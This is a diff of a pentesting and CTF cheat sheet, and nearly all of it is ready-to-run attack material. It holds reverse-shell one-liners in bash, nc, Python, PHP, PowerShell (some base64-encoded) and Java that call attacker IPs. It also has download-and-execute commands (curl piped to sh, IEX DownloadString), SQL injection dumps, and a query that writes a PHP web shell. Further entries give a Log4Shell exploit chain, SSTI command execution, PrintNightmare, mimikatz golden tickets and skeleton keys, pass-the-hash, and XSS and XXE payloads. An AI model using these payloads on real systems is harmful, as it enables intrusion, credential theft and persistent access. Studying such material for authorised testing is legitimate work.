@@ -1,267 +1,237 @@
-# THE 1337 FILE
-*****************
+ _____  _     _____   _ _____ _____  ____    _____ ___  _ _____    _____ _  _     _____
+/__ __\/ \ /|/  __/  / \\__  \\__  \/ _  \  /__ __\\  \///__ __\  /    // \/ \   /  __/
+  / \  | |_|||  \    | |  /  |  /  |\/ | |    / \   \  /   / \    |  __\| || |   |  \  
+  | |  | | |||  /_   | | _\  | _\  |   | |    | |   /  \   | |    | |   | || |_/\|  /_ 
+  \_/  \_/ \|\____\  \_//____//____/   \_/    \_/  /__/\\  \_/    \_/   \_/\____/\____\
 
+Version 0.9
+Changes are welcome!
+GitHub: https://github.com/Leetcore/1337-observer
+This file is my sheetcheat for pentesting and CTFs.
 
-# ENCODING
-## string to base64
-``` bash
+If you read with `less` type `-i` (ignore case) before searching.
+Type `/nc` to search.
+
+# 🔥 HOT HOT HOT
+In this file: log4shell (java), printnightmare (windows), pwnkit (linux).
+
+# ENCODING (encoding, enc)
+string to base64
 echo -n "string" | base64
-```
 
-## base64 to string
-``` bash
+base64 to string
 echo -n "base64" | base64 -d
-```
 
-## string to hex
-``` bash
-echo -n "string" | xxd -r -p
-```
+string to hex
+echo -n "hex" | xxd -r -p
 
-# LEAK SEARCH
-Search big leaks in a zipped way:
-```bash
-zgrep -a "@domain.de" BreachCompilation.tar.gz
-```
+# leak search (leak, grep)
+Search big leaks in a zipped way (bash):
+zgrep -ia "@domain.de" BreachCompilation.tar.gz
 
-# NETCAT
-Listing for shells:
-``` bash
+# NETCAT (netcat, nc)
+Listening for shells (bash):
 nc -nvlp 1337
-```
 
-# HASHCAT
+# HASHCAT (hashcat)
 Crack bcrypt hashes:
-```
 hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt 
-```
 
-# MSFVENOM
-Generate reverse shell exe:
-``` bash
+# MSFVENOM (msfvenom, msf, metasploit)
+Generate reverse shell exe (bash):
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1338 -f exe -o /home/kali/rev.exe
-```
 
-# start webserver
-Host files:
-``` bash
+# Python webserver
+Host files (bash):
 python3 -m http.server 8080
-```
 
-# POWERSHELL
-Download reverse shell from source:
-``` cmd
+# WinPeas in memory (windows, security tool)
+Download:
+https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat
+
+In Powershell:
+IEX(New-Object Net.WebClient).DownloadString('http://...')
+
+# POWERSHELL (powershell, ps)
+Download reverse shell from source (cmd):
 powershell -c "Invoke-WebRequest -Uri 'http://10.8.10.59:8080/rev.exe' -OutFile 'c:\Windows\Temp\rev.exe'"
 powershell -c "Invoke-WebRequest -Uri 'http://10.8.10.59:8080/winPEAS.bat' -OutFile 'c:\Windows\Temp\lin.bat'"
-```
-
-``` powershell
-Get-SmbShare
-```
-
-# WinPeas in memory
-``` powershell
-IEX(New-Object Net.WebClient).DownloadString('http://...')
-```
 
 # EVIL WinRM
-Pass the hash:
-``` bash
+Pass the hash (bash):
 evil-winrm -i spookysec.local -u administrator -H 0e0363213e37b94221497260b0bcb4fc
-```
 
-# John The Ripper
-Generate hash from files
-``` bash
+# John The Ripper (john, jtr, cracking hashes)
+Generate hash from files (bash):
 /path/other/xls2john excel.xls
 zip2john zipfile.zip
-```
 
-Remove spaces and newlines:
-``` bash
+Remove spaces and newlines (bash):
 echo -n "$hash$xyz" | cut -d "-" -f 1 > hash.txt
-```
 
-## cracking hashes
-``` bash
 john --wordlist=/usr/share/wordlists/rockyou.txt crack.hash
-```
 
 # Linux
-## from user to root
-``` bash
+PwnKit (linux, policy kit, root)
+Source: https://github.com/ly4k/PwnKit
+Download: wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
+
+Run in bash:
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+
+From user to root (Privilege Escalation)
 find / -perm +6000 2> /dev/null
-```
 
-## check apps you can run
-``` bash
+Check sudo apps you can run:
 sudo -l
-```
 
-## read root files
-``` bash
+Read root files with error messages (unstable):
 command_you_can_run --var-in-there="/root/flag.txt"
-```
 
-## core dumps
-``` bash
+Core dumps:
 ulimit -S -c unlimited
 kill -11 pid
 cat /var/crash/...
-```
 
-## proc
-``` bash
+Proc:
 /proc/net/tcp
 /proc/sched_debug
 /proc/pid/cmdline
-```
 
 # MINIMODEM
-## ascii to WAV
-``` bash
+Ascii to WAV:
 echo -n "string" | minimodem -t -f 1200.wav 1200
-```
 
-## wav to ascii
-``` bash
+Wav to ascii:
 minimodem -r -f 1200.wav 1200
-```
 
 # NMAP
-## basic scan
-``` bash
-sudo nmap -sV -sS -sC host
-```
+sudo nmap -sVC -sS host
+nmap -sVC --top-ports 1000 host
 
-## SNMP
-``` bash
+SNMP example with script wildcards
 sudo nmap --script=snmp* -sU IP
-```
 
-## vulners script
-Single target:
-
-``` bash
 nmap -sV --script vulners --script-args mincvss=9 host
-```
 
 Fast scanning a list of hosts:
-``` bash
 nmap --top-ports 100 --open -sV -T5 --script vulners --script-args mincvss=9 --stats-every 60s -iL domains.txt -oN nmap.txt
-```
 
-## nmap with searchsploit
-``` bash
+Nmap with searchsploit:
 nmap -sV -sC host -oX host.xml
 searchsploit --nmap host.xml
-```
 
 # SEARCHSPLOIT
-``` bash
 searchsploit "searchword"
 searchsploit -m 123idofexploit
 searchsploit -x 123idofexploit
-```
+
+# SQL Injection (SQLi, SQL, db)
+Auth bypass:
+admin'-- 
+
+Check for SQLi:
+' OR 1=1
+
+Check columns:
+id=1 order by 5
+id=1 union select 1,2,3,4
+id=1 union select 1,2,version(),4
+id=1 union select 1,2,user(),4
+id=1 union all select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database() --+
+id=1 union all select 1,,2,group_concat(column_name),4 from information_schema.columns where table_schema=database() and table_name='users'--+
+id=1 union all select group_concat(id),group_concat(username),group_concat(password) from users where table_schema=database()--+
+
+In SQL:
+select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
 
 # SQLMAP
 Save full request with header and body in request.txt:
-``` bash
 sqlmap -R request.txt --batch --random-refer
-```
 
 # WPSCAN
-## enumerate plugins, themes etc
-``` bash
+enumerate plugins, themes etc
 wpscan --url http://domain -e vp,dbe,cb
-```
 
-# REVERSE SHELL
+# SSH (port forwarding)
+ssh -L 3389:10.200.115.35:3389 -i id.key root@holo.live
+
+# REVERSE SHELLS
 Upgrade shell:
-```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+optional:
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
-```
 
-## Bash
-```
+bash
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
-```
 
-## SH
-```
+SH
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.177 1337 >/tmp/f
 rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7Csh+-i+2%3E%261%7Cnc+10.10.14.177+1337+%3E%2Ftmp%2Ff
-```
 
-## Python
-```
+Python
 exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
-```
 
-## Windows
-``` bash
+Windows
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
-```
 
-## PHP
-```
+PHP
 php -r '$sock=fsockopen("10.10.10.10",9001);exec("bash <&3 >&3 2>&3");'
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
-```
 
-## Powershell:
-```
+Powershell:
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
 
-```
 powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
-```
 
-```
 echo "$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()%" | base64
-```
 
 # LOCAL FILE INCLUSION (PHP)
-``` bash
 php://filter/convert.base64-encode/resource=/etc/passwd
-```
 
-``` bash
 String host="192.18.28.2";
 int port=4444;
 String cmd="bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-```
 
-# Server side template injection
+# Server side template injection (SSTI, express)
 Nunjucks/Express:
-``` javascript
+In Javascript:
 {{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
-```
+
+# GOBUSTER
+gobuster dir -u http://host/ -w /usr/share/wordlists/dirb/common.txt
+gobuster vhost -u http://host/ -w /usr/share/wordlists/dirb/big.txt | grep 200
+
+# WFUZZ
+-hh = hide response answer size
+wfuzz --hh 455 -w /usr/share/seclists/Discovery/Web-Content/big.txt 'http://host/?view=FUZZ'
+
+# NIKTO
+nikto -host http://host/
+
+# LOCAL FILE INCLUSION (lfi, php)
+Upload shell via Referer:
+curl 'http://host/notexist' -A "<?php system(\$_GET['cmd']);?>"
+
 
 # MONGODB
-``` bash
 mongo
 show dbs
 use dbname
 db.dbname.find()
-```
-# LOG4J (Log4Shell exploit)
 
-## Install and start LDAP server that redirects to your exploit class:
+# LOG4J (Log4Shell exploit, Java)
+Install and start LDAP server that redirects to your exploit class:
 https://github.com/mbechler/marshalsec
 
-``` bash
 git clone https://github.com/mbechler/marshalsec.git
 mvn clean package -DskipTests
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.IP:8000/#Exploit"
-```
 
-## Save exploit class to Exploit.java:
-``` java
+Save exploit class to Exploit.java:
+Java file:
 public class Exploit {
     static {
         try {
@@ -271,97 +241,109 @@ public class Exploit {
         }
     }
 }
-```
 
-## Compile exploit to Javacode:
-``` bash
+Compile exploit to Javacode:
 javac Exploit.java
-```
 
-## Host Javacode with python:
-``` bash
+Host Javacode with python:
 python3 -m http.server
-```
 
-## Wait for reverse shell:
-``` bash
+Wait for reverse shell:
 nc -lnvp 1337
-```
 
-## Trigger Log4J to connect with your LDAP:
-``` bash
+Trigger Log4J to connect with your LDAP:
 curl 'http://TARGET:8983/?foo=${jndi:ldap://YOUR.IP:1389/Exploit\}'
-```
 
-## Extract information from log4j:
-``` text
+Extract information from log4j:
+Just a string:
 ${jndi:${lower:l}${lower:d}a${lower:p}://xx.interactsh.com/poc}
 ${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.xx.interactsh.com/poc}
-```
 
 # ENUM4LINUX
-``` bash
 enum4linux 10.10.82.233
-```
 
 # SMBCLIENT
-``` bash
 smbclient \\\\ip\\nt4wrksv
-```
+
+# METASPLOIT
+Basic msfconsole:
+search php
+use 2
+show options
+set RHOSTS 1.1.1.1
+set RPORT 22
+set LHOST tun0
+set LPORT 1337
+run -j
+
+Portscan in msfconsole:
+auxiliary(scanner/portscan/tcp)
+set RHOSTS 10.200.115.0/24
+set THREADS 5
+run -j
 
 # WINDOWS
-Kerbrute: https://github.com/ropnop/kerbrute
-``` bash
+# printnightmare (PN, print, spool):
+Source: https://github.com/calebstewart/CVE-2021-1675.git
+Download: wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
+
+In Powershell:
+Import-Module .\cve-2021-1675.ps1
+Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
+
+# kerbrute (ad, brute force, pw)
+Quelle: https://github.com/ropnop/KERBRUTE
+Download: go get github.com/ropnop/kerbrute
+In Go binfolder:
 ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
-```
 
-Impacket: https://github.com/SecureAuthCorp/impacket
-``` bash
+# Impacket (windows)
+Source: https://github.com/SecureAuthCorp/impacket
+Download: git clone https://github.com/SecureAuthCorp/impacket.git
+Scripts are in /examples:
 python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
-```
 
-## PowerView
-https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
-``` powershell
+# POWERVIEW
+Source: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+Download: wget https://gist.githubusercontent.com/HarmJ0y/184f9822b195c52dd50c379ed3117993/raw/e5e30c942adb2347917563ef0dafa7054882535a/PowerView-3.0-tricks.ps1
+
+In Powershell:
 Get-NetUser | select cn
 Get-NetGroup -GroupName *admin*
-```
 
 # MIMIKATZ
+In mimikatz:
 mimikatz.exe, `privilege::debug` = 20?
+
 Export ticket:
-``` bash
 sekurlsa::tickets /export
-```
 
 Pass the ticket:
-``` mimikatz
+In mimikatz:
 kerberos::ptt <ticket>
-```
-``` cmd
+
+Check in CMD:
 exit
 klist
 dir \\ip\admin$
-```
+
 Golden/silver ticket:
-``` mimikatz
+In mimikatz:
+lsadump::lsa /patch
 lsadump::lsa /inject /name:krbtgt
 Kerberos::golden /user:Administrator /domain:controller.local /sid:$SID /krbtgt:$NTLM /id:$USERID
-```
+
 Golden/silver ticket to access other machines:
-``` mimikatz
+Check in mimikatz:
 misc::cmd
-```
 
 Skeleton key (every User-PW: mimikatz):
-``` mimikatz
+In mimikatz:
 misc::skeleton
-```
 
 # XSS
-``` html
+html
 "'><script>alert(1)</script>
-“”;</script><script>alert(/XSS/)</script><“
 "';</script><script>alert(/XSS/)</script><"
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
 '';!--"<XSS>=&{()}
@@ -373,11 +355,7 @@ misc::skeleton
 %22%27%3E%3C%68%31%3E%78%73%73%3C%2F%68%31%3E
 &#x22;&#x27;&#x3E;&#x3C;&#x68;&#x31;&#x3E;&#x78;&#x73;&#x73;&#x3C;&#x2F;&#x68;&#x31;&#x3E;
 &#34&#39&#62&#60&#104&#49&#62&#120&#115&#115&#60&#47&#104&#49&#62
-```
 
-# XXE
-XML external entities:
-``` xml
+# XXE (XML external entities):
+In XML:
 <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-```
-
